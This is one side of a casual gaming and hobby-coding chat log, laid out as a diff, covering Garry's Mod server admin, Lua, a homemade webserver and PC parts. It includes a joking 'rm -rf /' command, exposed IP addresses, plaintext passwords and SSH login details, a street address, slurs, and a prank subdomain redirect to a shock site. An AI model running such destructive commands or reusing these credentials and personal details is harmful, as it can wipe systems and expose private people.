@@ -1,0 +1,4042 @@
+I wanna party
+is this written in source
+it really feels like it
+its 12 am rain
+come on
+you know what I mean
+http://puu.sh/9cN8m/88e76d6ab0.jpg
+I just walked up to thi
+s
+my question has been answered
+thanks rain
+What do you mean\
+!!
+console doesnt work ;c
+http://puu.sh/9cOEh/89000021a5.jpg
+oh boy world protals
+I knew this game would get crazy
+this game is well worth the 15$
+and I have only done 3 endings
+lol
+TURN IT OFF
+FFS
+john what the hell
+i thought you were never gonna kill me as a t
+guess that's done huh
+alias dev_gagoff "dev say Mics have been unmuted; dev ungag John2143658709; -dev_voice"
+alias "dev_gagon" "dev say Mics have been muted;dev gag john2143658709; +dev_voice"
+I made those
+And bound them to keys
+How do I make it not make me make noise
+Without using gag
+there isn't like
+cl_sendvoice
+or something
+Yes
+Read all voice commands
+its voice_enable 0
+To enable and diable voice
+It doesn't go back
+on
+asdf
+Tell him to make a legitimate app
+It does
+But it fucks
+the bo0xes
+Rain
+I was in spec mode
+spawn me
+OH
+You left
+-.-
+lolwta
+lu
+ey
+Its on the forums on why
+College finals
+rcon lua_openscript ../addons/DevolvedAdmin/lua/autorun/server/sv_devadmin.lua;rcon lua_openscript ../addons/DevolvedAdmin/lua/autorun/sh_devadmin.lua;
+happy
+k
+because asdf
+Okay
+ama
+ask me anything
+I learned javasctipt
+then just could do luia
+lua
+What
+are you makiing a swep
+sv is hook.add("PlayerSay","name",function)
+cl is PlayerChat
+well
+to override for a gmaemode
+use GM:OnPlayerChat = function(ply,text.team,dead)
+...
+aint nobody got time
+fo dat
+but okay
+make a script
+just a new .lua
+and you know how to start a script right
+http://puu.sh/2RxjX.png
+type that
+yeah, devadmin
+http://puu.sh/2Rxma.png
+to send colored chat to a person
+this is what devadmin uses
+http://puu.sh/2Rxq4.png
+in sv
+http://puu.sh/2RxrD.png
+and that in cl
+Now
+run that
+through lua_openscript
+or a plugin
+and then type hi there in the chat
+err
+hai there
+yay.
+ey
+function SWEP:Reload() self.BaseClass.Reload(self) end
+oh
+You have to code that yourself
+look at the ttt shotugn
+no
+thats this month
+we havea  few years payed for
+local asdf123 = function()
+wat
+don't use simple timers then
+And I think they have pointer support anyway
+rain what kind of sorcery is this
+not on list
+try now
+go rain
+now?
+forums
+go
+nwo
+now
+And mach's psot
+post
+yes
+Okay, well game rules
+Everything else is up to admin descresion
+spelling
+asdf
+Uhhh
+no
+wat
+yeh ran
+killed by npc
+fixing it
+reload ttt cpde pls
+fixed
+what is datapack_list
+because access to the normal one isn't workin
+pointshop
+okay
+yeash
+# of people voting
+Make him finish that table
+I can't
+awkward
+wat
+steam chats
+don't read ingame chat when dead
+no
+yes
+sure
+Wow rain
+you seem mad
+xD
+apply
+wat
+no
+no
+tigo
+so I hear
+new idea
+Instead of respected being a new rank
+it acts like the plus
+yeh
+yeh
+Thats what it will be
+what
+because the in built ttt "map will change in x rounds" activates before mapvote finishes
+http://puu.sh/32xC5.png
+wat
+fixed
+restart it
+fixed
+gmodz?
+no
+Because by default they are
+8:55 PM] - Jackool: I'll be back after this friday
+http://puu.sh/36i6T.png
+http://puu.sh/36iaS.png
+http://puu.sh/36ibf.png
+ok
+ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:ːd2axeːd2brewmaster:
+awkwarf
+ːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeːːd2brewmasterːːd2axeː
+I bet you can't do that
+huh rain
+come at me
+http://cats4gold.com/weight/results/images/10168385-USD.jpg
+i bet u kis girls faget
+ill find u
+i already call admin
+he be here in minute
+im owners father
+i get u arrested
+harasment
+i m gary
+lol u fat den
+wat r u do?
+fat on me?
+i cal frist
+say u r haking
+dey get u
+awt
+About to get 11
+Like?
+ːcsgohelmetː
+>crafting another set
+ːd2antimageː
+ref, money
+market
+http://puu.sh/37Rqt.png
+Thats all I do
+http://puu.sh/37Rvy.jpg
+ːcsgoxː
+use it rain
+use it
+find a way
+Like?
+wat,
+ːcsgohelmetː
+ːcsgoxːːcsgoxːːcsgoxː
+I can see rain
+lol
+No, coding for tihs
+nope
+VexAdmin
+ok
+so like
+a week?
+rin
+stuff happened
+what a hacker
+Hows it feell ran
+hows it feel
+nan
+becaue rain
+nan
+no
+F3
+why
+I dont even own this server
+yeh
+try again
+its his fault
+!givepoints ^ 2inf
+I can edit stuff clientside
+because you knwo
+magic
+"Do we like rain?" "no, we hate rain"
+you made friends
+amdins
+asking me about you
+csquared
+public static String rain(){ return {"Steven","CSQUARED"}; }
+there rain
+I hope you feel good
+well
+public static String[] rain(){ return {"Steven","CSQUARED"}; }
+java
+no rain
+I told them
+to hate you
+Rain
+knife
+shouldnt be in
+Because its too good
+wat
+OH GOD RAIN NO
+RAIN NO PLEASE RAIN
+NO GOD NO
+RAIN NO
+Buy the courier pls
+rin no fed pls
+rain why
+waiting for jack
+to do somethign
+like?
+iunno
+I would hope he got a job
+yeh
+Rain
+if you see people
+aim there
+ffs
+HE JUMPED OUT AT YOU
+Dont follow me rain
+NO
+rain
+hi
+no
+yeh
+who
+iunno mang
+if you think that you're annoying than ok
+but otherwise ignore him
+raom
+get om
+rain
+get in
+rain
+rain
+ra
+ina
+rinar
+ianra
+rinar
+ianr
+airnari
+arna
+irna
+irnai
+rnai
+rna
+ranirani
+rarni
+ni
+arni
+rani
+ar
+niarn
+irani
+rani
+ar
+niarni
+arni
+rani
+arni
+arni
+arni
+aarni
+rani
+arni
+arni
+arni
+ni
+ar
+niarw nar
+arnn
+arn
+iar
+rain
+arni
+arni
+anri
+arni
+anir
+niara
+rnia
+rni
+niararni
+ani
+rarni
+arni
+arni
+niarani
+rrani
+rani
+rani
+arni
+arri
+nar
+ianra
+irnar
+ianr
+airna
+rinar
+ianra
+password is coley
+srs rain wtf
+join the lobby
+on
+no
+lol.
+3:05 AM] - Jackool: making weapons because i have my own rumble/boulder now
+thanks rain
+Why dioes uit not show you guys
+as playing
+71.163.32.92
+No
+Solo queuing
+overwatch
+sec
+yeh
+rain pls
+rain
+what is the command
+for clearing ban database
+not found
+and also
+!help
+how
+hjils5idtrykgy
+gdyk
+gdyk
+dgty
+k
+dgyk
+d
+etryhdfthjdftjiderjadtj
+dftjdtryftjdftj
+dftjdftj
+test
+asgesg
+test
+arhsdtrh
+ni
+I woke up 5 hours aho
+rain
+af
+sdfasdf
+asdf
+rain get in here
+?
+I meant my teamspeak channel
+thanks rain
+I really needed to hear that from you
+very encouraging words
+where is e2
+yeah I watched e1 on adult http://swim.com
+just today
+yeah
+I wanna watch both e2 and e3
+?
+http://puu.sh/jfPK8/a37f87370c.jpg
+https://redirector.googlevideo.com/videoplayback?requiressl=yes&id=62f0d5e2237c7572&itag=22&source=picasa&cmo=secure_transport=yes&ip=0.0.0.0&ipbits=0&expire=1438104796&sparams=requiressl,id,itag,source,ip,ipbits,expire&signature=7A77DDAAB2255C3088554507C0285892D033E308.1B6F072374FCD54BE540A6C4D2BB5E4739D4BBA5&key=lh1
+?
+on e3?
+rick rekindles love with a world controlling demigod and summer and morty disaproove
+not that interesting
+still good though
+http://arstechnica.com/gadgets/2015/07/google-officially-ends-forced-google-integration-first-up-youtube/
+yes
+inb4 reddit
+no but im going to bed
+so good luck finding out
+havent switched yet
+just go to windows update
+and select windows 10
+are you on 8.1
+oh idk then
+https://www.reddit.com/r/pcmasterrace/comments/3f10k0/things_to_removedisable_in_windows_10/
+I havent played csgo in like 3 weeks
+I havent seen that in the real game
+but yeah it looks like it could be
+none
+you have played gmod what
+the airboats
+the offroads
+all the driver seats are func vehicle
+because I never run programs I dont trust
+yeah it wasnt
+you dont have to run anything you download rain
+xcf
+is all I ever use
+I dont even know what is does
+just tar -xcf
+oh and j to make bzip2
+no
+no
+what is it
+nice
+http://puu.sh/jzqo0/c2e43af94a.png
+it was ok
+it crashed my computer
+which was cool
+yes
+1$
+okay it says it will take up to 48 hours to change
+http://rain.john2143.com
+all yours
+put a webserver there on port 80
+and just wait I guess
+yeah sure give 300$ and its all yours
+unless you want a self signed one then just give me it
+may good bones and calcium come
+yeah you know I wrote my own webserver
+https://github.com/John2143658709/john2143.com
+download it
+change const.js
+removed pages/
+remove*
+and remove .git
+or branch it
+/fork it
+because I want it to use very little memory
+thanks
+it caches the pages
+and restarts the server every so often
+to mimic the use that people give it
+a push server
+like devup.me
+but I never did it
+mainly because I didnt want to use sharex
+idk
+didnt care to switch
+http://john2143.com/p/8080
+nice
+goes to a port
+just sends like a 302 or something i dont remember
+bootstrap
+angular
+jquery
+3 main ones I know about
+bootstrap is more mobile oriented
+angular is really good
+jquery is more oriented to pages that get modified later
+but not rewritten
+depends on what you want
+basic coding classed
+learned lua through computercraft in mineccraft
+learned javascript adn html
+and then java
+then read a bunch of books on computers
+and operating systems
+and learned C and C++
+and now Im here
+yeah I will probably
+yes I wil 100%
+my uncle is head of technology for discovery
+so I'll prorbaly work there
+CTO or something
+https://www.linkedin.com/pub/bert-collins/2/7a7/262
+http://www.zoominfo.com/p/Bert-Collins/1608750425
+niceme.me
+starter pistols
+mfw
+yeah he lived with us for like 12 years
+idk
+have you seen him
+nice
+he looks like the average linux poweruser sysadmin
+yeah
+never shaved it
+ever
+no
+like gandalf beard
+last thing he said he was doing was working with the software devs to make a movie for shark week that would be viewable from an oculus rift
+so he came to my house and demod it for me
+oculus rifts are pretty cool
+what do you mean
+http://john2143.com/bouldercult
+what
+how would it get me banned from push
+puush
+as long as its all the same puush link it wont bother to reload it each time
+?
+vim with plugins
+thats what I use
+you can use intellij or eclipse or visual studio
+or even notepad ++ with plugins
+did you edit config.js
+no
+192.168.1.2 and 80 are mine
+ipconfig ipv4
+and then port forward port 80 to your computer
+or well
+first off
+set the ip to 127.0.0.1
+and try to access http://locahost
+what error now
+well EADDRNOTAVAIL means it cant bind port 80 on that address
+so turn off whatever webserver is on
+https://www.iis.net/
+nice
+type services.msc
+into start
+world wide publishing
+why would I know
+yeah doesnt it make your computer a file server or whatever
+well
+try running the server now
+dammit rain you've made we want to learn angular
+what is in that folder now
+I guess so
+Im pretty sure its from the add features thing
+if you were wondering
+nice
+theres so menu
+to add features to windows
+yeah
+that
+rip
+http://rain.john2143.com/
+add an html page there
+in the pages folder
+like what
+good old breifcase of files
+thanks windows
+I dont even remember how it wokred
+no they removed it in 7 didnt they
+well it says 2 way
+so mabye
+mabye not
+this implies it works with things that arent always on
+liek flash drives that will just auto sync when you plug them in
+jon
+only the pages/
+main.js is meant for static redirects
+okay
+pages/ is where you put whatever.html
+and then you go to http://rain.john2143.com/whatever
+and you get the thing
+main.js can have dynamic things along with static redirects
+anyway
+you get 3 arguments for functions
+the server object
+the result object thing
+and then the path
+no thats why all my pages use imgur
+like i said I wrote this for me
+not really
+what
+inline
+<style>
+https://developers.google.com/speed/libraries/?hl=en
+https://cdnjs.com/
+nginx
+uhhh
+apache loads files as they're requested
+so more disk time
+nginx loads them into ram
+so no dynamic pages
+oh also apache has htaccess
+which is cool
+you have a main file for it
+you just cant do directory level stuff easily iirc
+idk rain
+if you want to do php then do apache
+otherwise use nginx I guess
+yeah but its still one of the few good server side dynamic languages
+the other option is node for dynamic pages
+the options for serverside are either php or asp
+unless you want to use something that makes it native
+like node or ruby on rails
+I think nginx might support jsp mabye
+iunno you can google it
+http://nginx.org/en/docs/windows.html
+then its pretty simple
+its acutally a really good system but nobody uses rss readers so it sucks
+wasnt twitter originally an rss reader that wanted to be able to self publish stuff
+is twitter dumb
+because thats what it is now
+basically yeah
+sort of
+what
+mfw that was the least favorite of mine when I saw it
+at least as a full framework
+mabye angular + topcoat
+...yes
+nice
+some framworks that do full overhauls like bootstrap can be weird with angular
+I mean
+its the reason angular is like ng-wrapper-main
+and topcoat has topcoat-text-input
+and stuff
+but boostrap has stuff like span4 and stuff
+which is kinda generic
+okay ]
+you know like basic html right
+to do angular stuff you do something like <div class="ng-wrapper">
+and the ng-wrapper is what changes it to be angluarly modified
+so you can still do default html stuff
+and can cross frameworks
+but bootstrap iirc has stuff like <span class="span4"> which doesnt exactuly say where its from
+so it can make your code messy when you cross stuff
+and add your own custom stype
+style
+beacuse you then have stuff like <input type=text class="topcoat-text-imput span4 mycoolclass what is going on help">
+dont cross the beams or you become bad at computer
+you get confused and die
+What
+As in
+Simon violins is kill?
+That's not gonna happen
+what a meme
+do it
+what to heck rain
+when did you be good at rain
+ary
+not rain
+art.
+art.
+this looks really good for a polandball comic
+youre so hip
+that sounds like a full story to me
+dont be overly ambitious rain
+http://puu.sh/jNBU3/8c241db84d.png anyway rain heres progress
+2spooky
+I required sprintf wrong
+heres an example http://puu.sh/jNC3Y/8c7e8f897a.png
+too much shading on the hat imo but its fine
+just under the cap part
+yes
+the telephone pole looks to be a different art style
+keep a constant pen width
+ok
+thanks
+"not like this" ~some girl in the matrix
+no but I know people who do
+rain pls
+mfw art school
+mfw 4 years'
+high school
+art school
+hahahaha nice mee
+no everyone I know was really good
+not like get a free trip to a new york acting school good
+but like yeah they can draw stuff
+sorta I guess spend 300$ on pencils sort of people
+mfw not graphics tablets
+yeah probably actually
+no
+I had no idea
+nothing because I did music theory for my art credit
+slightly about that
+above
+I can read it and write sheet music
+sight sing/sight play
+I know chord progressions and stuff
+so better than 75% of musicians
+?
+Fuck this games dodging system
+you cant aim your dodge
+so you just died
+all the time
+mabye they should have different buttons for sheild and lock target
+Rin
+Yes
+I also now really know what happened with mythik
+He made his own server.
+Jackool: because the RP is changing so muchn
+Tain
+Rain
+Test auto
+8 bullets/
+//weaponname
+YOU NEED A NAME
+weapon_ttt_flare
+gun
+ttt_weapon_ak
+No
+do you want a website
+a domain
+a .me domain
+I have a free 1 year .me domain
+it has to be .me
+memememes.me isnt
+oh also juush is https now
+so you'll hvae to change your uplolad url if you use it
+?
+ TEEEEEEEEEEEEEEEEEEEM
+7$
+g2a
+what
+ok
+and you had a black baby
+what
+to hcek
+why
+riperino
+watch a playthrough
+riperoni
+that's just as bad as the 1-15 offlane meep
+minecraft pls
+lbrtle needs to build lbrtle house
+iunno
+we'll see
+invite tommrow
+name?
+heros?
+link
+yeah
+come on rain
+do your famous enigma jungle
+techies ancients
+easy
+rain nooo
+rm -rf /
+right click
+anything
+we do
+in the chicken
+place
+?
+he's not on
+then say off
+stay
+I was there
+he did it
+well I'll be on tommrowo
+Im going now
+asdf
+?
+tator cheated in master ninja gear :L
+and probably those balloons too
+wai would he dodis
+movie
+but what is rain was not kill
+rain
+rain
+ra
+irna
+iran
+irni
+arni
+arn
+iani
+rni
+ranir
+a
+inrani
+ni
+rani
+rni
+iaarni
+nanri
+n
+iar
+nia
+nini
+ra
+ni
+arni
+rni
+an
+i
+rnian
+arni
+nirni
+n
+i
+nira
+ninarni
+arni
+n
+ar
+niar
+iarnni
+r
+iiar
+we just need
++1
+git checkout master
+com,e back
+soon
+I'll updload my stuff that I have later tonight
+mabye
+it needs better netcode
+before I really wanna release it
+nice
+RuckaRuckaAli
+http://www.coderedhosting.com.au
+reon
+62-4 Prospector Rd, Whitehorse, Yukon Territory Y1A 5G5, Canada
+okay the psu has the 4+3 for the graphics card, 2+2 for the cpu, a 10-12 for the mobo and 2 sata power
+I dont know if you need any molex
+but I put those in there to
+I'll test the graphics card later
+and then send it I guess
+yeah
+I dont think Im missing any thing
+5 stack
+not a fan  of you sound levels
+turn up bomb to max
+turn down footsteps to aobut half
+turn ten seocnd warning to 30
+turn everything else off
+but w/e
+polay with it
+so what do you need
+wait show scoreboard
+ez wins
+> relax you're doing fine
+angles
+if you play your angles right this game
+you'll win hard
+ok
+rip
+heres some names http://puu.sh/hQ0BF/64e68ac31c.png
+indian german scandinavation china america
+scandinavtion type name
+AMERICAN
+ye
+mfe
+mfw
+yfw
+ye
+yes
+you still can
+:(
+idk
+my first rank was gn4
+and it took like 100 duo queues
+with tator
+where we didnt care about rank
+oh ok
+we did ti reddit
+rain im in the menu
+doing basiclaly nothing
+learning about demoinfogo
+http://puu.sh/hY80J/befae91975.png
+5.5 million lines
+what
+yes
+no
+no
+no
+never ever
+movie
+rain no
+yay
+ez wins
+me too
+ezpz
+iunno
+http://puu.sh/iksxZ/40ef740cff.png
+nice wording
+from valve
+all the NA dota servers are down
+8:32 PM - Rumble/Boulder: and keep him there
+voice_enable 0
+block
+no
+rain why
+:L
+wowl
+letsgo
+do it
+wow
+crazy
+no
+we
+are
+go
+come
+onm
+hello
+ficks
+dicks
+nein
+how much will you have left
+lol123
+how about I give you 5$
+rain pls
+like 600$ right now why
+i could be a lot of things
+me too thanks
+yeah what is that about
+where are you going
+ok
+yes
+wgat
+do you know him irl
+is that why you're rain and snow
+is there like hail and fog that I dont know about
+rain pls
+why so many grills
+so what is the point of the trip
+you said it was for first generation canadians
+but its not like they're trying to keep you in canada
+so why
+Canada’s birthday
+\o/
+just strange that they are trying to celebrate the birthday of a country
+>implying people celebrate
+mabye not
+also
+"go shopping at the Rideau Centre"
+why
+thats just a normal mall right
+oh
+yeah how do i give you money
+I dont know rain
+cant I just give you what you want
+and you give me items or something
+well its not tradeable for 7 days if I buy it
+so i guess you could give me like a 2.50$ skin
+and i'll give you it in 7 days
+gotta get those monster summer sale cards
+717
+wow.
+its just a white circle
+yeah the 600+ have cool flag looking things
+227,465
+mfw
+also
+you should probably wait
+until the last day of the sale
+oh
+I thought it was for another week
+time to go buy games
+why not
+okay I baught games
+we did it rain
+hmm
+that may just be because of the sale
+yeah it gives them a redeeming link
+ez game
+how many rounds
+wow
+thats actually crazy
+because your elo is messed up because you play with us]
+remember that game I solo queued for
+where it was supremes
+okay
+it was my team of 2 lems 2 supremes
+yeah
+dont worry
+yeah
+you have to wait like 10 minutes
+for replays to work
+I was 3rd
+\o/
+game balance
+what even is this
+because blender does particle rendering already
+it can be but its meant for way more complex things
+https://youtu.be/ckkPiVZ3Lys?t=68
+well thats not really possible for any large things
+you generally simulate in realtime and then can render in 1-10 hours
+you can tell from stuff like the env cloth large thing that they are really cutting corners with rendering
+most domain hosters have the ability to just use their whois
+but this should be a thing
+but only for personal stuff
+its still important to see where sites are hosted
+and who by
+http://puu.sh/iDQKt/bdaea51f32.png
+no
+hmm
+1and1 shouldnt be providing that stuff
+zzzzzzz
+rain pls
+sit down
+dont be a dick
+done
+dont be obese
+and you can get by no problems
+also download some movies or something on your phone
+buy one
+also mfw lost in canada
+rain pls
+theres nothing to worry about then
+yeah sure go nuts
+no because nothing happens
+airports are more interesting
+crazy people
+kids
+angry people
+its liretally so common theres no chance you wont see it
+obvously I use airports like dulles
+which is one of the largest in the world
+so idk
+but if you're going to ontario or whatever
+thers gonna be a lot of people there
+just dont bring more than carry on
+if you can help it
+rain are you sure
+you cant help it
+rain what could you possibly need thats more than carryon
+how long will you be there
+you can probably get by on 4 sets of clothes
+but if you have like 2 bags
+thats easily 6
+just dont pack any denim
+and you can get a lot of chlothes
+bag return is iffy
+it can take a few hours
+174.52.247.62
+orbas
+rain
+rain
+7779
+96.241.37.169
+emily
+what do you mean all
+idk
+all mine go to 127.0.53.53
+http://puu.sh/iTcqc/90d07c31ef.png
+screenshot?
+is it the 502 error pls contact devolopers error?
+do you have page source?
+google doesnt use flash
+check your extensions
+guide aloe vera
+what
+yes but only xp
+why
+I just opened it on my real computer
+whats up
+http://Aloe-Vera-fr.com
+trying to figure out what webserver they're using
+because any link on any subdomain is a blank page
+instead of a 404 or 50x
+which could be tricking google into thinking thats a real page on the site
+same link each time?
+so does this happen when you search
+or one of the google redirect links
+my best guess is that the html processor is receive raw assembly from a non code source
+which would be a pretty big exploit in chrome
+but it would explain the random elements and links and newlines
+and obvoisly the text
+but mabye its on googles end
+yeah google pads their html with a lot of things to make it compatible
+so I guess its in googles end
+everything on aloevera gave me 200
+weird
+no idea
+tinybuttlogcut
+we made it to level 7
+8
+????
+rain
+its semimodular
+what do you need
+sata power is extended from the sata cables on the drives
+I think I sent another sata cable with the thing
+for use in the extra connectors
+no
+no
+pls dont
+so what do you have
+a sata cable
+or what
+like
+6pin to sata power
+thats 6pin to molex
+unless you need molex power you dont need that
+no its possible
+I just dont know what you have
+http://images17.newegg.com/is/image/newegg/12-400-106-TS?$S300$ ?
+yeah
+you need more of the one
+I posted
+just
+tell me what you have
+well you obviously have at least one
+hard drives use the same power as dvd
+sata power =/= sata dable
+data
+cable
+asdfasefase
+you can do 6pin => molex => sata
+if you have that
+okay
+so the second one is sata data
+those go to your motherboard
+where drives plug in
+panic
+rain
+do you have that recording
+of when everyone called my house
+because they got my phone number
+wayyyy back
+when I was manager
+we all got on rugs server
+and prank called
+and people called my house
+rain pls
+what
+okay putting up http://rainisafaggot.john2143.com
+pointing it to http://meatspin.com
+cool
+do it
+unless it downscales it then do it
+yeah the difference between 60 to 75 is equal to about 75 to 120
+nothing
+Yeah I need a 144hz montior
+and anew mouse
+help
+I canjt evne play that game
+because I can just get a 144 one
+rain life is just harder for you I guess
+I woudlnt know
+mabye if I dated asian girls
+but no rain
+no experience
+how about eagle to global
+yeah but not really
+until I get my new mouse
+not playing competitive until I have a mouse
+the sensor went bad
+so Im gettinga new one
+like a year
+mabye
+didnt try
+What about I'm afk
+rain what
+wanna cs
+ok
+thats a yes
+right
+yes
+I dont think it was them
+I think it was an exploit
+I ahve an idea of how it was done
+yes
+mfw I was right
+yes
+Wanna play csgo
+what stream
+what is he doing
+rain
+do you have anything to ssh with
+can you login to rain@john2143.com
+exactly what I put
+password test
+ok cool it works
+what do you mean
+I was just testing to see if I could ssh tunnel
+do tmux a
+can yoi
+see steuff
+I guess we both cant attach to the same session
+nice
+hey
+I have this port forwarded
+so I can access this anyway
+anywhere
+I mean
+then
+I can ssh into stuff on my network
+through this
+how about now
+tmux ls shows 1
+reattach
+to the session
+I mostly just use that to compile stuff
+and run http://john2143.com
+so now its also an ssh tunnel
+its so when I am up from your computer
+my
+I can access it
+sure
+is it today?
+cool
+I'll go look
+rain
+you do
+ye?
+cs.
+oklay!
+what a player
+yes
+Why am I being pokes
+I can't see
+no
+it doesnt have the gl headers
+and library
+http://puu.sh/kyEhL/228841be8e.png
+idk yet
+how about a more teambased
+faster paced
+realm
+'area governed by the disgruntled diety'
+yes
+idk
+I'm gonna write the backend in lua I think
+or python
+But I dont know much python
+why
+what
+well I mean
+you can do that anway
+nobody has
+I guess thats pretty common
+its just a weird feeling
+to code something so bad
+but remember our plan
+"Dont release the bad ones"
+yeah
+it has that example file
+with some slightly more annoying ones than rosepoco
+https://github.com/John2143658709/Test-Game
+what do you think
+?
+yeah what
+well windows sucks
+and doesnt have a clock() function
+well it does
+but it measures it in ms
+not nano seconds
+because ms isnt precise enough
+game developers
+what
+you can either have 58 fps or like 65 with ms
+it isnt accurate
+how do you get the time for the frame then
+ok
+nice
+I mean
+the original game
+was 30 lines
+50% of this code
+is for the timer
+yeah basically
+There's no floats what
+Help
+csgop
+yes
+porbably more than one
+why
+why
+ping 8.8.8.8
+change your dns
+ye
+I dont have it either
+but I have the toolings
+what
+I use mingw
+I have all the stuff setup though
+to compile visual studio
+ok
+ok
+I have to write my own compile thing
+http://i.imgur.com/GfzgSvm.png :(
+http://i.imgur.com/cEfmqmi.png
+hello
+what
+no
+we cant just copy braid
+nicememe
+what do you have the date in
+unix time?
+so what do you want
+seconds from the hour?
+the general way you do it
+if you have seconds from day start would be
+i mean
+it depends
+on how your caluclations works
+work
+it it worth ito
+to round up
+err
+round off
+and multiply up
+var secondsFromDay = 0; //...
+division is all integer division
+as in
+it rounds down
+no floating points
+i saw
+yte
+no
+wtf
+they must have really shitty practices
+literally just roleback
+to first working patch
+then look at diffs
+how old
+idk
+check steam
+screenshots
+loan
+loaned keys
+no
+I mean
+yes
+but the scrollbar
+mabye I got double back
+idk
+0 arkam
+no problems
+karma
+yes
+jeez rain
+calm down
+mineacr is hard
+minecraft
+buit anyway
+are you asking balance wise
+or code wise
+I mean
+obviously balance wise
+just straight copying it
+its way too strong
+so idk
+divide damage by 4?
+remember
+i mean
+theres servers that have all the guns
+what do you mean realistic
+not that I know of no
+i did it before
+I just never added it
+basically on swep fire
+ye
+you have to do your own ray calculations
